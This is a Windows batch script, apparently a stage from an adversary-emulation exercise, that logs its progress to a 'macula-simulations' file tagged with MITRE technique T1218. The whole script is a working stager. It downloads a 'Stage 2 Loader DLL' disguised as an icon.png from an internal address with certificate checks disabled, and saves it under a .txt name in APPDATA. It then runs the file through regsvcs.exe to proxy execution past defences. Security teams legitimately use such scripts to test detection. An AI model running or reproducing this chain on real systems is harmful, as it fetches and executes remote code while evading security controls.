@echo off
setlocal enabledelayedexpansion

REM Random-named SET variables for all PHR placeholders
SET aB3xK=%APPDATA%\10391\9f62889b
SET mN9qT=60470d25.txt
SET vXcLm=https://10.0.0.49/stage/2/icon.png?10391-7
SET rT5yH=ITZEL-S2B
SET pL2oI=10391
SET wE4uJ=7

REM Cache timestamp once using immediate expansion (not delayed)
SET tsvar=%DATE%/%TIME%

REM Construct log file path from 7 (not %APPDATA%\7\macula-simulations.log)
SET logfile=%APPDATA%\!wE4uJ!\macula-simulations.log

REM Debug: heartbeat start
echo [!tsvar!][DEBUG][!rT5yH!][!pL2oI!]: heartbeat_start>> "!logfile!" 2>nul

REM Heartbeat curl - download Stage 2 Loader DLL
curl -k -s -o "!aB3xK!\!mN9qT!" "!vXcLm!"

REM Check curl result; on failure log and exit
if !errorlevel! neq 0 (
    echo [!tsvar!][DEBUG][!rT5yH!][!pL2oI!]: heartbeat_failed>> "!logfile!" 2>nul
    echo [%date% %time%][TTP][!rT5yH!][!pL2oI!]: T1218^|System Binary Proxy Execution=[FAIL]:[heartbeat_download_failed] >> "!logfile!" 2>nul
    exit /b 1
)

REM Debug: heartbeat complete
echo [!tsvar!][DEBUG][!rT5yH!][!pL2oI!]: heartbeat_complete>> "!logfile!" 2>nul

REM Debug: chdir start
echo [!tsvar!][DEBUG][!rT5yH!][!pL2oI!]: chdir_start>> "!logfile!" 2>nul

REM Change directory to output location
cd /d "!aB3xK!" >nul 2>&1

REM Debug: chdir result
echo [!tsvar!][DEBUG][!rT5yH!][!pL2oI!]: chdir_result>> "!logfile!" 2>nul

REM Debug: regsvcs start
echo [!tsvar!][DEBUG][!rT5yH!][!pL2oI!]: regsvcs_start>> "!logfile!" 2>nul

REM Invoke Stage 2 Loader via regsvcs.exe /U
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U "!mN9qT!" >NUL 2>&1

REM Debug: regsvcs result
echo [!tsvar!][DEBUG][!rT5yH!][!pL2oI!]: regsvcs_result=!errorlevel!>> "!logfile!" 2>nul

REM Per-TTP log line - conditional on errorlevel
if !errorlevel! equ 0 (
    echo [%date% %time%][TTP][!rT5yH!][!pL2oI!]: T1218^|System Binary Proxy Execution=[OK]:[] >> "!logfile!" 2>nul
) else (
    echo [%date% %time%][TTP][!rT5yH!][!pL2oI!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed] >> "!logfile!" 2>nul
)

REM Debug: log complete
echo [!tsvar!][DEBUG][!rT5yH!][!pL2oI!]: log_complete>> "!logfile!" 2>nul

endlocal